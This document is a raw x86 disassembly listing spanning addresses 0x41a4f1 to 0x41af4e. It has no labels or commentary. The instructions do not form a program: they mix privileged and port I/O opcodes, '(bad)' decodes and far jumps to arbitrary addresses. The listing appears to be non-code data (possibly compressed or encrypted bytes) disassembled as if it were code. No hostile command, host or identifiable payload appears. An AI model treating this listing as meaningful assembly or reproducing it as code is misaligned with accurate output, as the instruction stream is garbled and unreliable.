  41a4f1:	add    BYTE PTR [edi],dl
  41a4f3:	xchg   ebx,eax
  41a4f4:	ret    0x1707
  41a4f7:	xchg   ebx,eax
  41a4f8:	push   0xe8033ec0
  41a4fd:	add    esp,DWORD PTR [edi]
  41a4ff:	pop    ebp
  41a500:	cli    
  41a501:	clc    
  41a502:	mov    bh,0x60
  41a504:	bound  esi,QWORD PTR [edi]
  41a506:	out    0xe7,al
  41a508:	jmp    0x41a512
	...
  41a532:	add    BYTE PTR [eax],al
  41a534:	push   edi
  41a535:	mov    al,ds:0x2f49cc1a
  41a53a:	retf   
  41a53b:	daa    
  41a53c:	nop
  41a53d:	pop    edi
  41a53e:	pusha  
  41a53f:	dec    edi
  41a540:	pop    edx
  41a541:	inc    edi
  41a542:	ret    0x4bfc
  41a545:	fistp  WORD PTR [ecx]
  41a547:	add    edi,DWORD PTR [esi]
  41a549:	pop    ebx
  41a54a:	add    BYTE PTR [edx+ecx*8+0x5a],ah
  41a54e:	add    cl,ch
  41a550:	cmp    eax,0xa12cbe4
  41a555:	loop   0x41a5a3
  41a557:	add    eax,0xd4c542e
  41a55c:	push   ss
  41a55d:	push   0x5b3d1385
  41a562:	add    BYTE PTR [edx+0x1],dh
  41a565:	aas    
  41a566:	adc    BYTE PTR [ebx+0x41],dh
  41a569:	call   0x9d89:0x5b409d37
  41a570:	inc    ecx
  41a571:	outs   dx,DWORD PTR ds:[esi]
  41a572:	mov    ecx,0x5b3deb
  41a577:	xchg   ebp,eax
  41a578:	cmp    DWORD PTR [esi+ecx*4-0x33],edx
  41a57c:	mov    DWORD PTR [ecx-0x5aff2103],ebx
  41a582:	add    cl,ch
  41a584:	cmp    eax,0x2dc554e4
  41a589:	push   esp
  41a58a:	fidivr DWORD PTR [edx+0x1c]
  41a58d:	out    0x4b,al
  41a58f:	jmp    0x41a543
  41a591:	sub    BYTE PTR [ecx],0x55
  41a594:	push   ds
  41a595:	inc    ebx
  41a596:	mov    ah,BYTE PTR ds:0x0
	...
  41a5c0:	add    BYTE PTR [eax],al
  41a5c2:	inc    edi
  41a5c3:	pop    ebx
  41a5c4:	cmp    ch,al
  41a5c6:	into   
  41a5c7:	pusha  
  41a5c8:	inc    ecx
  41a5c9:	sub    BYTE PTR ds:0xc5bb72b5,al
  41a5cf:	daa    
  41a5d0:	and    al,0xd5
  41a5d2:	les    eax,FWORD PTR [edi]
  41a5d4:	and    al,0x1
  41a5d6:	gs mov ch,0xd
  41a5d9:	sbb    ebx,DWORD PTR gs:[eax+eax*1-0x17]
  41a5de:	push   esp
  41a5df:	aaa    
  41a5e0:	and    al,0xf9
  41a5e2:	mov    ds:0xb538511e,eax
  41a5e7:	test   eax,0x97045be8
  41a5ec:	std    
  41a5ed:	add    BYTE PTR [ebx+eiz*1+0x24],ch
  41a5f1:	adc    BYTE PTR [ebx+ebp*1+0x24],ch
  41a5f5:	sbb    BYTE PTR [esi+0x2d],al
  41a5f8:	xchg   esi,ecx
  41a5fa:	pop    esp
  41a5fb:	xchg   eax,ebp
  41a5fd:	lahf   
  41a5fe:	pop    ebp
  41a5ff:	nop
  41a600:	sti    
  41a601:	sub    ebp,DWORD PTR [edi-0x1c]
  41a604:	dec    esp
  41a605:	and    al,0xcb
  41a607:	pop    ebp
  41a608:	jmp    0xc4c246c5
  41a60d:	dec    esi
  41a60e:	js     0x41a592
  41a610:	xchg   DWORD PTR [ebx+edi*1+0x47],ebp
  41a614:	mov    ebp,0xc2e595fa
  41a619:	sar    edi,0x6f
  41a61c:	inc    ecx
  41a61e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a61f:	pop    eax
  41a620:	and    al,0x10
  41a622:	pushf  
  41a623:	mov    ah,0x76
  41a625:	push   es
	...
  41a64e:	add    BYTE PTR [eax],al
  41a650:	push   ds
  41a651:	and    esp,DWORD PTR [eax+ebx*1]
  41a654:	cmp    al,0x25
  41a656:	aaa    
  41a657:	mov    cs,WORD PTR [ebx-0x15000268]
  41a65d:	push   ebp
  41a65e:	dec    edi
  41a65f:	push   ecx
  41a660:	fsub   QWORD PTR [eax-0x6e929c18]
  41a666:	sti    
  41a667:	mov    ebx,DWORD PTR [ebx]
  41a669:	cmp    edx,DWORD PTR [eax]
  41a66b:	mov    ebp,DWORD PTR [edi-0x1b]
  41a66e:	inc    esp
  41a66f:	and    al,0x4f
  41a671:	sub    dl,BYTE PTR [eax-0x75]
  41a674:	mov    eax,ds:0xfa5084
  41a679:	xchg   ecx,eax
  41a67a:	xchg   eax,ecx
  41a67c:	dec    esp
  41a67d:	mov    ds:0x473b6c87,al
  41a682:	mov    eax,0x2ac1bdab
  41a687:	imul   DWORD PTR [esi-0x513e351c]
  41a68d:	jo     0x41a68e
  41a68f:	leave  
  41a690:	ds test edx,ecx
  41a693:	cmp    DWORD PTR [edx-0x62],esi
  41a696:	adc    DWORD PTR [edx+0x4a],esi
  41a699:	or     eax,0xb4a244d
  41a69e:	dec    ebp
  41a69f:	and    al,0x46
  41a6a1:	sti    
  41a6a2:	push   esp
  41a6a3:	and    al,0x4e
  41a6a5:	aaa    
  41a6a6:	jle    0x41a6a8
  41a6a8:	add    WORD PTR [ecx],0x39
  41a6ac:	mov    eax,0xc9fffd7d
  41a6b1:	mov    bh,0x19
  41a6b3:	mov    DWORD PTR [eax],eax
	...
  41a6dd:	add    BYTE PTR [eax-0x4600024b],bh
  41a6e3:	pop    esp
  41a6e4:	cld    
  41a6e5:	jbe    0x41a721
  41a6e7:	ins    DWORD PTR es:[edi],dx
  41a6e8:	cld    
  41a6e9:	jmp    0x803e0428
  41a6ee:	jns    0x41a671
  41a6f0:	imul   edi,edi,0x30ff6c99
  41a6f6:	xchg   ecx,eax
  41a6f7:	or     al,0x3
  41a6f9:	mov    DWORD PTR [edx+0x2b],ecx
  41a6fc:	mov    al,BYTE PTR [esi+0x17e5e]
  41a702:	cmp    eax,0x1a6c8249
  41a707:	mov    dh,0x4
  41a709:	je     0x41a757
  41a70b:	pop    es
  41a70c:	test   BYTE PTR ds:0xfdf347bb,0x59
  41a713:	lods   al,BYTE PTR ds:[esi]
  41a714:	or     al,0x87
  41a716:	add    bl,BYTE PTR [esi+0x1c]
  41a719:	xchg   edx,ebp
  41a71b:	gs adc al,0x89
  41a71e:	cli    
  41a71f:	pop    ebp
  41a720:	and    BYTE PTR [ecx-0x76eb976e],cl
  41a726:	and    BYTE PTR [eax+0x1c],0x5d
  41a72a:	mov    BYTE PTR [edi-0x77],ch
  41a72d:	push   eax
  41a72e:	cmp    bh,bl
  41a730:	or     ebx,DWORD PTR [ecx-0x43]
  41a733:	pop    ebx
  41a734:	stos   DWORD PTR es:[edi],eax
  41a735:	adc    al,0xfc
  41a737:	imul   esp,edi,0xffffff80
  41a73a:	sbb    dl,BYTE PTR [edx+ebp*2+0x78]
  41a73e:	pop    edx
  41a73f:	pop    ds
  41a740:	out    0x4d,eax
	...
  41a76a:	add    BYTE PTR [eax],al
  41a76c:	(bad)  
  41a76d:	mov    esp,?
  41a76f:	or     ch,BYTE PTR [edi]
  41a771:	fwait
  41a772:	sbb    eax,0xa9540281
  41a777:	sbb    al,0x3e
  41a779:	loop   0x41a79e
  41a77b:	and    BYTE PTR [esi-0x20],bh
  41a77e:	daa    
  41a77f:	outs   dx,DWORD PTR ds:[esi]
  41a780:	inc    esp
  41a781:	fisubr DWORD PTR [edi]
  41a783:	cmc    
  41a784:	push   0xfc3c2bda
  41a789:	jae    0x41a772
  41a78b:	mov    BYTE PTR [edx],cl
  41a78d:	aas    
  41a78e:	stos   DWORD PTR es:[edi],eax
  41a78f:	jle    0x41a80a
  41a791:	cmovge ecx,DWORD PTR [ecx+0x7ea33f12]
  41a798:	mov    WORD PTR [edi],cs
  41a79a:	inc    ebp
  41a79b:	mov    eax,eax
  41a79d:	outs   dx,DWORD PTR ds:[esi]
  41a79e:	jmp    0x41a7a3
  41a7a0:	and    esi,DWORD PTR ds:[eax+0x7e]
  41a7a4:	pop    esi
  41a7a5:	pop    edi
  41a7a6:	out    0x3,eax
  41a7a8:	mov    ecx,0x79fff7e5
  41a7ad:	xchg   esi,eax
  41a7ae:	aas    
  41a7af:	out    0x77,al
  41a7b1:	test   DWORD PTR [edx+0x31],edx
  41a7b4:	sub    DWORD PTR [esi],0x5ba9ade6
  41a7ba:	mov    bh,0x42
  41a7bc:	lods   al,BYTE PTR ds:[esi]
  41a7be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7bf:	xor    BYTE PTR [ebx+0x66],bh
  41a7c2:	xchg   ebp,eax
  41a7c3:	mov    edx,0x4284649
  41a7c8:	jno    0x41a765
  41a7ca:	sbb    bh,BYTE PTR [ebp+0x180cd4b]
	...
  41a7f8:	add    BYTE PTR [eax],al
  41a7fa:	outs   dx,BYTE PTR ds:[esi]
  41a7fb:	sbb    al,0xe7
  41a7fd:	sar    dh,cl
  41a7ff:	dec    ecx
  41a800:	add    BYTE PTR [esi-0x154832c6],ch
  41a806:	dec    ebp
  41a807:	push   esi
  41a808:	add    BYTE PTR [eax-0x1a402403],bh
  41a80e:	dec    esi
  41a80f:	mov    al,ds:0x963d907f
  41a814:	std    
  41a815:	jmp    0xa9c54689
  41a81a:	cmp    bl,dl
  41a81c:	mov    ecx,0x515b3df0
  41a821:	pusha  
  41a822:	xor    esp,edx
  41a824:	dec    esi
  41a825:	in     eax,0xbc
  41a827:	cwde   
  41a828:	sbb    BYTE PTR [ecx-0x16416a30],cl
  41a82e:	cmp    al,0x5b
  41a830:	add    BYTE PTR [ebp+eiz*2-0x6a],ah
  41a834:	push   esp
  41a835:	pusha  
  41a836:	dec    esp
  41a837:	dec    esp
  41a838:	shr    ah,0x3d
  41a83b:	pop    ebx
  41a83c:	add    cl,ch
  41a83e:	mov    dh,0x3d
  41a840:	lds    ebp,FWORD PTR [ebp-0x16026a60]
  41a846:	cmp    eax,0x9129815b
  41a84b:	push   eax
  41a84c:	add    ch,ah
  41a84e:	cmp    eax,0xbc05725b
  41a853:	cwde   
  41a854:	add    ch,ah
  41a856:	cmp    eax,0x7128815b
  41a85b:	inc    edx
  41a85c:	stc    
  41a85d:	je     0x41a85f
	...
  41a887:	add    BYTE PTR [ebx-0x1d],bh
  41a88a:	mov    ds,ebp
  41a88c:	popa   
  41a88d:	xchg   ebp,eax
  41a88e:	std    
  41a88f:	bound  ecx,QWORD PTR [ebx-0x24]
  41a892:	enter  0xd3e6,0xdc
  41a896:	and    al,0xe5
  41a898:	cmp    eax,0x4267875b
  41a89d:	pop    ecx
  41a89e:	add    cl,ch
  41a8a0:	mov    edx,0x230004f5
  41a8a5:	pop    ecx
  41a8a6:	add    BYTE PTR [ecx+0x45ba9],cl
  41a8ac:	pop    ss
  41a8ad:	sbb    BYTE PTR [edx],bh
  41a8af:	mov    edi,DWORD PTR [ecx+0x73]
  41a8b2:	add    al,0x0
  41a8b4:	daa    
  41a8b5:	push   ss
  41a8b6:	xchg   esi,eax
  41a8b7:	adc    BYTE PTR [ebx],ah
  41a8b9:	pop    ecx
  41a8ba:	add    BYTE PTR [ecx+0x47769],cl
  41a8c0:	out    0x16,eax
  41a8c2:	add    eax,0x1c432389
  41a8c7:	mov    esp,DWORD PTR [ebx]
  41a8c9:	inc    ebx
  41a8ca:	push   esp
  41a8cb:	mov    ch,bl
  41a8cd:	pop    edi
  41a8ce:	sahf   
  41a8cf:	adc    al,0xe3
  41a8d1:	pop    eax
  41a8d2:	add    BYTE PTR [ecx],al
  41a8d4:	mov    ecx,0xd700046f
  41a8d9:	push   eax
  41a8da:	test   DWORD PTR [ebx+esi*1+0x6f],edi
  41a8de:	test   DWORD PTR [ebx+eax*2+0x67],edi
  41a8e2:	test   DWORD PTR [esi+0x5c9b],ebx
  41a8e8:	sub    esp,DWORD PTR cs:[eax+ebx*2]
	...
  41a914:	add    BYTE PTR [eax],al
  41a916:	lods   al,BYTE PTR ds:[esi]
  41a917:	popf   
  41a918:	or     eax,DWORD PTR [esi+0x6054]
  41a91e:	or     ah,ah
  41a920:	add    BYTE PTR [eax],al
  41a922:	xchg   edi,eax
  41a923:	pop    eax
  41a924:	xchg   DWORD PTR [ebx+esi*2+0x24],eax
  41a928:	add    eax,0x4c8746d3
  41a92e:	and    DWORD PTR [eax+0x3d],0xffffff89
  41a932:	fwait
  41a933:	cmp    al,0x18
  41a935:	test   BYTE PTR [esi],bl
  41a937:	adc    ch,BYTE PTR [ecx]
  41a939:	mov    esi,DWORD PTR [ebx-0x36749fc4]
  41a93f:	addr16 add al,0x0
  41a942:	push   edi
  41a943:	jne    0x41a991
  41a945:	and    al,0x3e
  41a947:	push   edx
  41a948:	push   esi
  41a949:	mov    eax,edx
  41a94b:	lea    eax,ds:0x58693e00
  41a951:	and    al,0x8e
  41a953:	jae    0x41a9d2
  41a955:	dec    esp
  41a956:	pop    edx
  41a957:	outs   dx,BYTE PTR ds:[esi]
  41a958:	push   esi
  41a959:	dec    edi
  41a95a:	sbb    edx,esi
  41a95c:	xchg   ah,al
  41a95e:	cs pop es
  41a960:	ror    DWORD PTR ds:0x96ec2,0x3e
  41a967:	test   eax,0x6f5a244d
  41a96c:	push   ss
  41a96d:	mov    DWORD PTR [edx-0x5a],esp
  41a970:	inc    ebp
  41a971:	mov    DWORD PTR [edx+0x5287419e],edx
  41a977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a978:	sbb    eax,0x87
	...
  41a9a1:	add    BYTE PTR [eax],al
  41a9a3:	add    BYTE PTR [edx-0x62],dh
  41a9a6:	sbb    ecx,ebp
  41a9a8:	xor    DWORD PTR [ecx],ecx
  41a9aa:	inc    ebp
  41a9ab:	and    al,0x72
  41a9ad:	or     DWORD PTR [edi+0x14],edi
  41a9b0:	cmp    al,BYTE PTR [edx-0x2e82d6ff]
  41a9b6:	push   esi
  41a9b7:	dec    edi
  41a9b8:	ret    
  41a9b9:	cmc    
  41a9ba:	and    eax,0xbf090c34
  41a9bf:	call   0xfe33f281
  41a9c4:	(bad)
  41a9c7:	sub    al,0xbd
  41a9c9:	add    ecx,DWORD PTR ds:0x81bba
  41a9d0:	ds stc 
  41a9d2:	xchg   BYTE PTR [edx+eax*2],ah
  41a9d5:	add    BYTE PTR [ecx],0xc5
  41a9d8:	cli    
  41a9d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9da:	adc    eax,0x1823e00
  41a9df:	aaa    
  41a9e0:	cli    
  41a9e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9e2:	sbb    DWORD PTR [ebx-0x24],esi
  41a9e5:	add    dl,dh
  41a9e7:	inc    DWORD PTR [eax+0x5b]
  41a9ea:	ins    DWORD PTR es:[edi],dx
  41a9eb:	push   esi
  41a9ec:	aas    
  41a9ed:	pop    ebx
  41a9ee:	out    0x2a,eax
  41a9f0:	cli    
  41a9f1:	ds vmlaunch 
  41a9f5:	and    ebp,edx
  41a9f7:	add    edi,DWORD PTR [esi]
  41a9f9:	out    0x2b,al
  41a9fb:	sub    BYTE PTR [esi+0x2a],cl
  41a9fe:	adc    dl,cl
  41aa00:	(bad)  
  41aa01:	sub    esp,DWORD PTR [edx-0x3e]
  41aa04:	es jle 0x41a9ba
  41aa07:	icebp  
	...
  41aa30:	add    BYTE PTR [eax],al
  41aa32:	adc    esp,edi
  41aa34:	xor    ebp,DWORD PTR [eax]
  41aa36:	inc    esi
  41aa37:	sub    bh,BYTE PTR [eax]
  41aa39:	jge    0x41aa2b
  41aa3b:	out    0xaf,al
  41aa3d:	fdiv   QWORD PTR [edx+0x37f18e8a]
  41aa43:	sahf   
  41aa44:	idiv   BYTE PTR [esi+0x45]
  41aa47:	pop    esi
  41aa48:	out    0x3,eax
  41aa4a:	mov    bh,0x17
  41aa4c:	retf   
  41aa4d:	sub    edx,DWORD PTR ds:0x3e03e45b
  41aa53:	(bad)  
  41aa55:	test   bl,cl
  41aa57:	pop    ebp
  41aa58:	out    dx,al
  41aa59:	xchg   DWORD PTR [ecx],edi
  41aa5b:	pop    esi
  41aa5c:	out    0x3,eax
  41aa5e:	jne    0x41aabb
  41aa60:	int3   
  41aa61:	add    edi,DWORD PTR [esi]
  41aa63:	(bad)  
  41aa65:	test   BYTE PTR [ebx-0x567811a2],ch
  41aa6b:	pop    ebp
  41aa6c:	out    0x3,eax
  41aa6e:	(bad)  
  41aa6f:	das    
  41aa70:	add    ecx,DWORD PTR [edi+eax*8+0x17]
  41aa74:	retf   
  41aa75:	push   edi
  41aa76:	mov    bh,0xe9
  41aa78:	repz pop es
  41aa7a:	ds pop ebx
  41aa7c:	ret    0xc1c4
  41aa7f:	pop    ss
  41aa80:	ret    
  41aa81:	and    eax,DWORD PTR [esi]
  41aa83:	sub    esi,DWORD PTR [ebp+edi*1+0x69]
  41aa87:	sub    ebp,DWORD PTR [ecx+0x17b555]
  41aa8d:	int    0x19
  41aa8f:	sub    ecx,DWORD PTR [ecx-0x5508de1]
  41aa95:	out    0x0,al
	...
  41aabf:	add    BYTE PTR [esi-0x1c],cl
  41aac2:	dec    esp
  41aac3:	add    eax,0xd4c4a22
  41aac8:	and    dh,0x41
  41aacb:	call   0xe565c284
  41aad0:	nop
  41aad1:	getsec 
  41aad3:	jb     0x41aae1
  41aad5:	sub    eax,0x16f5a789
  41aada:	cmc    
  41aadb:	scas   al,BYTE PTR es:[edi]
  41aadc:	push   cs
  41aadd:	in     al,0x4c
  41aadf:	int    0x7d
  41aae1:	fiadd  DWORD PTR [ebp+eax*8+0x59]
  41aae5:	in     al,0x44
  41aae7:	int    0x81
  41aae9:	sub    ecx,DWORD PTR [edi+0x62]
  41aaec:	inc    DWORD PTR [edx-0x701181d3]
  41aaf2:	mov    DWORD PTR ds:0xa1293716,ebp
  41aaf8:	inc    edx
  41aaf9:	call   0x5e38:0x7bbfb0b8
  41ab00:	in     al,0xa1
  41ab02:	cli    
  41ab03:	jb     0x41ab00
  41ab05:	shr    eax,1
  41ab07:	test   BYTE PTR [edx-0x63],0xe9
  41ab0b:	sbb    DWORD PTR [ebx],esi
  41ab0d:	pop    ds
  41ab0e:	and    al,0x15
  41ab10:	or     eax,0xa451cee4
  41ab15:	xchg   ch,bh
  41ab17:	sbb    ah,BYTE PTR ss:[edi]
  41ab1a:	and    al,0xa5
  41ab1c:	adc    dh,BYTE PTR [ebx+0x1b61ad89]
  41ab22:	push   edx
  41ab23:	mov    ecx,0x0
	...
  41ab4c:	add    BYTE PTR [eax],al
  41ab4e:	add    ah,BYTE PTR [ecx-0x7088e018]
  41ab54:	std    
  41ab55:	ret    0xe385
  41ab58:	rol    DWORD PTR [eax],0xec
  41ab5b:	and    DWORD PTR [eax+ebx*2],esp
  41ab5e:	(bad)  
  41ab60:	loop   0x41ab65
  41ab62:	fs xchg edi,eax
  41ab64:	mov    ebp,0x445665f8
  41ab69:	and    al,0x1b
  41ab6b:	inc    esi
  41ab6c:	call   0x44d9faee
  41ab71:	and    al,0x3b
  41ab73:	pop    eax
  41ab74:	add    BYTE PTR [eax],al
  41ab76:	daa    
  41ab77:	in     al,0xfb
  41ab79:	jbe    0x41abba
  41ab7b:	ds ins BYTE PTR es:[edi],dx
  41ab7d:	and    al,0x5b
  41ab7f:	or     esi,DWORD PTR [eax]
  41ab81:	mov    esp,DWORD PTR [ebx+0x43]
  41ab84:	sub    BYTE PTR [ebp+0x36],dl
  41ab87:	adc    al,0xce
  41ab89:	call   0x3d352f
  41ab8e:	mov    WORD PTR [ebx],?
  41ab90:	and    al,0x44
  41ab92:	pop    esp
  41ab93:	lahf   
  41ab94:	xchg   DWORD PTR [ebx+edi*8+0x1c],eax
  41ab98:	push   edx
  41ab99:	push   eax
  41ab9a:	ins    BYTE PTR es:[edi],dx
  41ab9b:	shr    eax,1
  41ab9d:	stos   DWORD PTR es:[edi],eax
  41ab9e:	imul   eax,DWORD PTR [eax+0x14a43bfb],0xa2f245c
  41aba8:	or     bh,al
  41abaa:	fwait
  41abab:	cmp    BYTE PTR [ecx+eax*1],dl
  41abae:	xlat   BYTE PTR ds:[ebx]
  41abaf:	pop    esp
  41abb0:	add    BYTE PTR [ebp+0x0],al
	...
  41abda:	add    BYTE PTR [eax],al
  41abdc:	adc    BYTE PTR [edx],dl
  41abde:	dec    ecx
  41abdf:	cmp    ebx,esi
  41abe1:	cmp    BYTE PTR [ebp+edi*2-0x28],al
  41abe5:	adc    eax,0x5c9b148e
  41abea:	add    BYTE PTR [edx-0x5a],ch
  41abed:	sub    eax,0xaf318b4d
  41abf2:	fwait
  41abf3:	repz pusha 
  41abf5:	add    BYTE PTR [edi-0x78e784ac],0xd8
  41abfc:	ds std 
  41abfe:	inc    edi
  41abff:	and    al,0xfe
  41ac01:	rcl    DWORD PTR [ecx-0x77],cl
  41ac04:	js     0x41ac70
  41ac06:	pop    edi
  41ac07:	mul    BYTE PTR [ecx-0x6f]
  41ac0a:	jp     0x41ac58
  41ac0c:	and    bl,BYTE PTR [edx+0x70c54f58]
  41ac12:	jg     0x41ac70
  41ac14:	es sbb ecx,0x5c
  41ac18:	dec    eax
  41ac19:	mov    cl,0xee
  41ac1b:	cmp    DWORD PTR [esi],edx
  41ac1d:	std    
  41ac1e:	dec    esp
  41ac1f:	and    al,0x96
  41ac21:	and    dl,bh
  41ac23:	les    eax,FWORD PTR [edx+0x3e00185e]
  41ac29:	add    BYTE PTR [ecx],0xe9
  41ac2c:	inc    ebp
  41ac2d:	add    eax,0x822a246d
  41ac32:	inc    BYTE PTR [edx+0x184f8]
  41ac38:	mov    ebp,0xc80cffee
  41ac3d:	sbb    al,0x4
	...
  41ac67:	add    BYTE PTR [eax],al
  41ac69:	add    BYTE PTR [esi],bh
  41ac6b:	std    
  41ac6c:	push   esp
  41ac6d:	and    al,0x1e
  41ac6f:	or     eax,0x823a1483
  41ac74:	add    DWORD PTR [ecx-0x7eb0f804],eax
  41ac7a:	std    
  41ac7b:	adc    DWORD PTR [edx-0x7f],0xfffffffe
  41ac7f:	adc    DWORD PTR [ecx-0x75],0x72
  41ac83:	push   esi
  41ac84:	xor    BYTE PTR [edi-0x3b],cl
  41ac87:	aaa    
  41ac88:	fst    DWORD PTR [eax-0x7611df49]
  41ac8e:	add    bl,BYTE PTR [esi+0x34]
  41ac91:	cmp    edx,edi
  41ac93:	push   ebp
  41ac94:	sbb    al,0x89
  41ac96:	repnz pop ebp
  41ac98:	cmp    BYTE PTR [edx-0x3b],dl
  41ac9b:	outs   dx,DWORD PTR ds:[esi]
  41ac9c:	push   ecx
  41ac9d:	jl     0x41acfc
  41ac9f:	pop    ebx
  41aca0:	(bad)  
  41aca2:	lea    ecx,[edi-0x1c6985e2]
  41aca8:	stos   DWORD PTR es:[edi],eax
  41aca9:	daa    
  41acaa:	es es mov bh,0x7a
  41acae:	js     0x41ac32
  41acb0:	adc    eax,0xd28f63f8
  41acb5:	ret    0xdbb1
  41acb8:	or     DWORD PTR [edx],eax
  41acba:	aas    
  41acbb:	popf   
  41acbc:	bound  edi,QWORD PTR [ebx-0x27166e77]
  41acc2:	adc    al,0x83
  41acc4:	shl    edi,0x3b
  41acc7:	(bad)  
  41acc8:	(bad)  
  41acc9:	int3   
  41acca:	(bad)  
  41accb:	pop    ss
  41accc:	add    ebx,DWORD PTR [eax+eax*1]
	...
  41acf7:	add    BYTE PTR [ebp+0x16be722b],cl
  41acfd:	mov    ds:0xe31bedb4,eax
  41ad02:	lahf   
  41ad03:	sbb    DWORD PTR [edi],eax
  41ad05:	pop    ebx
  41ad06:	mov    al,ds:0x72ba21ac
  41ad0b:	push   ds
  41ad0c:	or     eax,DWORD PTR [ebp-0x5e381548]
  41ad12:	test   al,0xdb
  41ad14:	push   ebx
  41ad15:	pop    edx
  41ad16:	mov    eax,ds:0xbb378279
  41ad1b:	add    dh,dh
  41ad1d:	push   edx
  41ad1e:	nop
  41ad1f:	outs   dx,DWORD PTR ds:[esi]
  41ad20:	inc    esi
  41ad21:	xchg   esi,eax
  41ad22:	sub    ebp,DWORD PTR [eax]
  41ad24:	sub    bl,BYTE PTR [edi+eiz*8+0x3]
  41ad28:	fsub   DWORD PTR ds:[esi+0x76]
  41ad2c:	push   ss
  41ad2d:	push   edx
  41ad2e:	and    al,0x70
  41ad30:	(bad)  
  41ad32:	mov    ebx,0xb92b6e27
  41ad37:	js     0x41adb1
  41ad39:	xor    DWORD PTR [ebp-0x9],0xffffffa3
  41ad3d:	mov    ?,WORD PTR [edx-0x34]
  41ad40:	(bad)  
  41ad41:	pop    ss
  41ad42:	add    BYTE PTR ds:0x62502a32,cl
  41ad48:	enter  0x7d83,0x1c
  41ad4c:	xchg   ebx,eax
  41ad4d:	nop
  41ad4e:	cmp    DWORD PTR [ecx+0x7b],eax
  41ad51:	loop   0x41ad55
  41ad53:	jmp    0x6721:0x8d815b3d
  41ad5a:	add    dh,dh
	...
  41ad84:	add    BYTE PTR [eax],al
  41ad86:	mov    eax,0x3de90288
  41ad8b:	fdiv   st(3),st
  41ad8d:	jmp    0x5b3d:0xe9d4e052
  41ad94:	mov    DWORD PTR ds:0x35893b16,esi
  41ad9a:	xor    cx,WORD PTR [ecx+0x57496f]
  41ada1:	jmp    0x193d7b64
  41ada6:	mov    edi,0xbf1b0198
  41adab:	call   0xed24:0x1f911901
  41adb2:	ins    BYTE PTR es:[edi],dx
  41adb3:	in     al,0xce
  41adb5:	xchg   ecx,eax
  41adb6:	aam    0x92
  41adb8:	std    
  41adb9:	sahf   
  41adba:	jbe    0x41add3
  41adbc:	and    al,0xd9
  41adbe:	jbe    0x41ade7
  41adc0:	and    al,0xd5
  41adc2:	data16 das 
  41adc4:	and    al,0xd1
  41adc6:	push   ss
  41adc7:	pushf  
  41adc8:	push   edx
  41adc9:	jb     0x41ad66
  41adcb:	sub    bh,BYTE PTR [esp+ecx*8-0xb]
  41adcf:	rep outs dx,BYTE PTR ss:[esi]
  41add2:	fisubr DWORD PTR [ecx]
  41add4:	push   ecx
  41add5:	jb     0x41ad5a
  41add7:	aad    0x44
  41add9:	add    eax,0x5c15835e
  41adde:	mov    ds:0x619d898f,al
  41ade3:	aaa    
  41ade4:	sub    DWORD PTR [eax],eax
  41ade6:	push   esi
  41ade7:	loope  0x41ae68
  41ade9:	loop   0x41adeb
	...
  41ae13:	add    BYTE PTR [edx+ebx*2-0x66a0743e],ah
  41ae1a:	cmc    
  41ae1b:	add    bh,ah
  41ae1d:	ins    DWORD PTR es:[edi],dx
  41ae1e:	call   0xfbc0d222
  41ae23:	push   ebp
  41ae24:	mov    ah,0x12
  41ae26:	into   
  41ae27:	mov    DWORD PTR [ebx+0x45e82c35],esp
  41ae2d:	xchg   bl,bh
  41ae2f:	(bad)  
  41ae30:	in     al,dx
  41ae31:	rol    DWORD PTR [edi+0x27358344],1
  41ae37:	enter  0xd064,0xb8
  41ae3b:	jmp    0xf76fc135
  41ae40:	outs   dx,BYTE PTR ds:[esi]
  41ae41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae42:	cli    
  41ae43:	mov    ebp,ebp
  41ae45:	xchg   esi,eax
  41ae46:	in     eax,0x1f
  41ae48:	and    al,0xcf
  41ae4a:	xchg   DWORD PTR [ebx+eax*2+0x4b],eax
  41ae4e:	inc    edi
  41ae50:	cmp    al,0xae
  41ae52:	jns    0x41ae5c
  41ae54:	loopne 0x41ae71
  41ae56:	and    al,0x14
  41ae58:	es pop ecx
  41ae5a:	add    BYTE PTR [eax],al
  41ae5c:	mov    ds:0x1c287680,al
  41ae61:	pushf  
  41ae62:	jl     0x41ae88
  41ae64:	ins    BYTE PTR es:[edi],dx
  41ae65:	sub    esp,DWORD PTR [eax+esi*1]
  41ae68:	aaa    
  41ae69:	and    eax,0xc6bfce87
  41ae6e:	hlt    
  41ae6f:	(bad)  
  41ae70:	mov    eax,0x238bd80c
  41ae75:	cmp    ebp,DWORD PTR [eax]
  41ae77:	push   ebp
	...
  41aea0:	add    BYTE PTR [eax],al
  41aea2:	aaa    
  41aea3:	or     al,0xce
  41aea5:	call   0x3d3a1f
  41aeaa:	sbb    al,0x9f
  41aeac:	or     ecx,DWORD PTR [edx+eax*2+0x3e000055]
  41aeb3:	add    DWORD PTR [eax+0x24],ebp
  41aeb6:	push   edx
  41aeb7:	cmp    dl,0x82
  41aeba:	inc    esp
  41aebb:	add    BYTE PTR [ecx],0x0
  41aebe:	(bad)
  41aec1:	pop    eax
  41aec2:	mov    ebx,0x1583f945
  41aec7:	add    DWORD PTR [ecx],0x0
  41aeca:	mov    ebp,0xc00d0335
  41aecf:	rol    BYTE PTR [eax+eax*1],cl
  41aed2:	ds stc 
  41aed4:	dec    edi
  41aed5:	and    al,0x12
  41aed7:	stc    
  41aed8:	mov    eax,0x77529
  41aedd:	or     dl,BYTE PTR ds:0xc5027235
  41aee3:	cmp    eax,0x96028954
  41aee8:	or     eax,0x54516129
  41aeed:	mov    ecx,DWORD PTR [edx-0x3ab0d7aa]
  41aef3:	mov    bl,0x7c
  41aef5:	pop    esp
  41aef6:	bound  edx,QWORD PTR [esi-0x24]
  41aef9:	int3   
  41aefa:	sub    DWORD PTR [ebp+0x569a37ea],edx
  41af00:	xor    BYTE PTR [edx+0x4a],dh
  41af03:	stc    
  41af04:	dec    esp
  41af05:	and    al,0x0
	...
  41af2f:	add    BYTE PTR [esi+0x65],cl
  41af32:	push   esi
  41af33:	mov    eax,esi
  41af35:	jmp    0xed3ba362
  41af3a:	jle    0x41af14
  41af3c:	lds    edi,FWORD PTR ds:0x52913820
  41af42:	jge    0x41af12
  41af44:	(bad)  
  41af45:	mov    ds:0x98d9fded,eax
  41af4a:	(bad)  
  41af4b:	mov    DWORD PTR [edx-0x62],esi
  41af4e:	or     eax,0x34f92e7e
